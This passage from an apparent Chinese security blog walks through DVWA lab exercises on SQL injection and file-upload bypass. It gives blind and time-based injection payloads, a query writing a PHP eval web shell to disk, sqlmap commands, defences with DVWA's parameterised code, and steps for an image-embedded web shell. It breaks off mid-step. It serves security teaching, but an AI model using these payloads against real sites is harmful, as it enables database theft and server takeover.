href="#判断页面有无布尔类型状态，布尔盲注" class="headerlink" title="判断页面有无布尔类型状态，布尔盲注"></a>判断页面有无布尔类型状态，布尔盲注</h2><p>输入</p><p>?id=1’ and 1=1#</p><p>?id=1’ and 1=2#</p><p>如果页面返回不同则说明存在bool类型状态，则可以bool盲注</p><p>payload参考如下</p><blockquote><p><a href="https://www.jb51.net/article/93445.htm">https://www.jb51.net/article/93445.htm</a></p><p><a href="https://gcdcx.blog.csdn.net/article/details/105851290">https://gcdcx.blog.csdn.net/article/details/105851290</a></p></blockquote><p><strong>注：布尔盲注工作量太大，需要布尔盲注自动化脚本</strong></p><blockquote><p>?id=2’ and (select length(column_name) from information_schema.columns where table_name=0x656d61696c73 limit 0,1)=2#</p><p>判断当前数据库的第一张表的表名长度是否为2</p></blockquote><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>其他注入都用不了的情况下，可以使用延时注入，其是根据页面响应是否延时来进行脱库的</p><p>比如在dvwa的low级别输入以下payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=9),sleep(5),1)#</span></span><br></pre></td></tr></table></figure><p>提交后页面延时了5s，说明dvwa数据库的第一个表的表名长度为9</p><p><strong>注：延时注入工作量太大，需要延时注入自动化脚本,链接如下</strong>：</p><blockquote><p><a href="https://github.com/W0lfier/sqlTimeDelay/blob/master/sqlinject_timebased.py">https://github.com/W0lfier/sqlTimeDelay/blob/master/sqlinject_timebased.py</a></p></blockquote><h2 id="二阶段工作完成"><a href="#二阶段工作完成" class="headerlink" title="二阶段工作完成"></a>二阶段工作完成</h2><h2 id="第三阶段（脱库）"><a href="#第三阶段（脱库）" class="headerlink" title="第三阶段（脱库）"></a>第三阶段（脱库）</h2><p>根据第二阶段选择的注入手法，进行脱库，脱库已经在第二阶段的联合查询注入模块详细阐述了</p><h2 id="第三阶段工作完成"><a href="#第三阶段工作完成" class="headerlink" title="第三阶段工作完成"></a>第三阶段工作完成</h2><h2 id="sql注入读写文件"><a href="#sql注入读写文件" class="headerlink" title="sql注入读写文件"></a>sql注入读写文件</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol><li>secure-file-priv</li></ol><p>需要配置secure-file-priv</p><p>该参数在高版本的mysql 数据库中限制了文件的导入导出</p><p>改参数可以写在my.ini 配置文件，并重启mysql 服务</p><p>打开C:\phpStudy\MySQL\my.ini 配置文件，在[mysqld]下添加 secure-file-priv</p><table><thead><tr><th>secure-file-priv参数配置</th><th>含义</th></tr></thead><tbody><tr><td>secure-file-priv=</td><td>不对mysqld的导入导出操作做限制</td></tr><tr><td>secure-file-priv=’c:/a/‘</td><td>限制mysql的导入导出操作发生在c:/a/下（子目录有效）</td></tr><tr><td>secure-file-priv=null</td><td>限制mysqld不允许导入导出操作</td></tr></tbody></table><ol start="2"><li>当前用户具有文件读写权限</li><li>要知道要写入文件的存放位置的<strong>绝对路径</strong></li></ol><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>以dvwa的low级别为例</p><p>写入文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select &#x27;</span><span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_POST[<span class="number">777</span>]); ?<span class="operator">&gt;</span><span class="string">&#x27;,2 into outfile &#x27;</span>D:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\sqli\\shell.php<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,load_file(&#x27;</span>C:\\Windows\\System32\\drivers\\etc\\hosts<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><hr><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap命令与参数：</p><blockquote><p><a href="https://blog.csdn.net/weixin_43590262/article/details/117229524">https://blog.csdn.net/weixin_43590262/article/details/117229524</a></p><p><a href="https://www.cnblogs.com/php09/p/10404560.html">https://www.cnblogs.com/php09/p/10404560.html</a></p></blockquote><hr><p>两种入门注入方式：</p><p>-u 目标url //记得设置cookie等参数</p><p>-r http请求.txt //对于post请求等比较友好因为不用设置参数，txt里面都有</p><p>eg：sqlmap -r test1.txt -p id –dbs -v 4 //test1.txt在sqlmap根目录下</p><hr><blockquote><p>数据库中的数据表很多，通过sqlmap快速找出存放用户名和密码的表，一把梭</p><p><a href="https://blog.csdn.net/weixin_42253265/article/details/112465258">https://blog.csdn.net/weixin_42253265/article/details/112465258</a></p><p>eg：sqlmap -u “<a href="http://192.168.43.61/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://192.168.43.61/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> -v4 –cookie=”security=low; PHPSESSID=8opisrbkl2ismd04b6bse88rp7” -D dvwa -search -C user,password</p></blockquote><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol><li>基于攻击特征的匹配过滤。这是目前使用最为广泛的方式，系统会将攻击特征做成数据库，一旦匹配到这些攻击特征就会认定检测到SQL注入。这种方式可以有效的过滤大部分SQL注入攻击，但是大大增加了程序的复杂度，同时可能影响到业务的正常查询。</li><li>对用户输入进行转义。例如，常见的SQL注入语句中都含有“‘’”，通过转义将“‘’”转义为“/”，SQL注入语句就会达不到攻击者预期的执行效果，从而实现对SQL注入进行防御。</li><li>数据类型进行严格定义，数据长度进行严格规定。比如查询数据库某条记录的id，定义它为整型，如果用户传来的数据不满足条件，要对数据进行过滤。数据长度也应该做严格限制，可以防止较长的SQL注入语句。</li><li>严格限制网站访问数据库的权限。</li><li>近几年来，随着机器学习与人工智能技术的火热，基于机器学习的检测SQL注入方法成为了新的研究方向。首先将样本SQL语句转换为特征向量集合，使用机器学习的方法进行训练，将得到的模型投入使用，利用训练的模型检测传入的数据是否包含恶意SQL注入。</li><li>其他防御措施。例如，避免网站显示SQL执行出错信息，防止攻击者使用基于错误的方式进行注入；每个数据层编码统一，防止过滤模型被绕过等。</li></ol><h3 id="附DVWA的sql注入impossib源码"><a href="#附DVWA的sql注入impossib源码" class="headerlink" title="附DVWA的sql注入impossib源码"></a>附DVWA的sql注入impossib源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Was a number entered?</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line"><span class="comment">// Check the database</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get values</span></span><br><span class="line"><span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line"><span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1</span>. user_token：用户token防止重放攻击以及csrf</span><br><span class="line"><span class="number">2</span>. is_numeric()函数用于检测变量是否为数字或数字字符串。</span><br><span class="line"><span class="number">3</span>. prepare ()准备要执行的SQL语句并返回一个 PDOStatement 对象，采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入</span><br><span class="line"><span class="number">4</span>. <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span>只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/lay_loge/article/details/90445180">https://blog.csdn.net/lay_loge/article/details/90445180</a></p><p><a href="https://www.jianshu.com/p/5de47d05e333">https://www.jianshu.com/p/5de47d05e333</a></p><p><a href="https://gcdcx.blog.csdn.net/article/details/105851290">https://gcdcx.blog.csdn.net/article/details/105851290</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之文件上传漏洞复现</title>
      <link href="/2021/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传是Web 应用的必备功能之一，比如上传头像显示个性化、上传附件共享文件、上传脚本更新网站。如果服务器配置不当或者没有进行足够的过滤，Web 用户就可以上传任意文件，包括恶意脚本文件、exe 程序等，这就造成了文件上传漏洞。</p><p>正常文件上传抓包分析：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200139.png"></p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>文件上传漏洞的成因，一方面服务器配置不当会导致任意文件上传；</p><p>另一方面，Web 应用开放了文件上传功能，并且对上传的文件没有进行足够的限制；</p><p>再者就是程序开发部署时候，没有考虑到系统特性和验证过滤不严格而导致限制被绕过，上传任意文件。</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200507.png"></p><h2 id="文件上传条件"><a href="#文件上传条件" class="headerlink" title="文件上传条件"></a>文件上传条件</h2><p>1、Web 服务器要开启文件上传功能，并且上传api（接口）对外开放</p><p>2、Web 用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，Web 目录都有执行权限</p><p>3、要想完美利用文件上传漏洞，就是上传的文件可以执行，也就是Web 容器可以解析我们上传的脚本，无论脚本以什么样的形式存在</p><p>4、无视以上条件的情况就是服务器配置不当，开启了PUT 方法。</p><p>5、要知道文件保存在了哪里，即上传路径</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>当系统存在文件上传漏洞时，攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，服务器如果对其解析执行则会造成很大的危害。</p><h2 id="文件上传绕过方法"><a href="#文件上传绕过方法" class="headerlink" title="文件上传绕过方法"></a>文件上传绕过方法</h2><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般一个文件上传过程中的<strong>检测方式</strong>有∶</p><ol><li>前端js检测</li><li>后端检测</li></ol><p>而后端检测分为:</p><ul><li>MIME类型检测</li><li>文件后缀名检测（白名单和黑名单）</li><li>文件内容检测</li></ul><h3 id="绕过前端js检测"><a href="#绕过前端js检测" class="headerlink" title="绕过前端js检测"></a>绕过前端js检测</h3><p>例如如下前端代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="javascript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span></span><br><span class="line"><span class="javascript">            alert(errMsg);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> ο<span class="attr">nsubmit</span>=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当点击提交按钮时会执行js脚本检查文件后缀是否符合白名单</p><p>这种前端验证的措施是很容易就可以绕过的，介绍两种方式：</p><ul><li>因为JS脚本运行环境使浏览器，我们可以修改JS代码，或者删除表单事件中的οnsubmit=”return checkFile()”</li><li>使恶意文件后缀名符合白名单策略，用Burp挂代理抓包，然后修改文件后缀名即可</li></ul><h3 id="绕过MIME类型检测"><a href="#绕过MIME类型检测" class="headerlink" title="绕过MIME类型检测"></a>绕过MIME类型检测</h3><p>MIME 是描述消息内容类型的因特网标准。MIME 消息包含文本、图像、音频、视频以及其他应用程序的专用的数据。常见的MIME 类型如下</p><table><thead><tr><th><strong>文件扩展名</strong></th><th><strong>Mime-Type</strong></th></tr></thead><tbody><tr><td><strong>.js</strong></td><td><strong>application/x-javascript</strong></td></tr><tr><td><strong>.html</strong></td><td><strong>text/html</strong></td></tr><tr><td><strong>.jpg</strong></td><td><strong>image/jpeg</strong></td></tr><tr><td><strong>.png</strong></td><td><strong>image/png</strong></td></tr><tr><td><strong>.pdf</strong></td><td><strong>application/pdf</strong></td></tr></tbody></table><p>例如如下后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line">print_r(<span class="variable">$_FILES</span>);</span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$_FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。</p><p>通过print_r进行打印可以看到$_FILES如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">  [userfile] =&gt; Array</span><br><span class="line">  (</span><br><span class="line">    [name] =&gt; 1.png</span><br><span class="line">    [type] =&gt; image/png</span><br><span class="line">    [tmp_name] =&gt; /private/var/tmp/phplVHp3W</span><br><span class="line">    [error] =&gt; 0</span><br><span class="line">    [size] =&gt; 344925</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>通过后端代码可以看出来对文件的上传类型即content-type字段以及文件大小进行了限制</p><p>所以在上传的时候需要用bp抓包将shell.php的content-type改为改为image/png即可</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200235.png"></p><p>发现上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210721200321.png"></p><h3 id="绕过黑白名单检测"><a href="#绕过黑白名单检测" class="headerlink" title="绕过黑白名单检测"></a>绕过黑白名单检测</h3><ol><li><p><strong>对于白名单常用的绕过方法有：</strong></p><ul><li>上传图片木马+文件包含</li><li>上传图片木马+.htaccess攻击</li><li>上传图片木马+IIS,Nginx解析漏洞（Apache解析漏洞不行）</li></ul><p>后端代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$uploaded_ext为文件名的后缀，然后判断其是否是jpg，jpeg，png。这里用strtolower()函数是为了防止黑名单中的大小写绕过</p><p><strong>绕过方法一：上传图片木马+文件包含</strong></p><ul><li><p>图片木马的制作</p><p>准备一个png图片，准备一个shell.php，其中shell.php内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>cmd下键入命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy <span class="number">1</span>.png /b + shell.php /a shell.png</span><br></pre></td></tr></table></figure><p>这样制作出来的图片木马比单纯的只是给shell.php修改为shell.png来说不仅可以绕过文件名验证还可以绕过图片内容验证</p></li><li><p>将制作好的shell.png利用上传漏洞上传到服务器</p><p><img 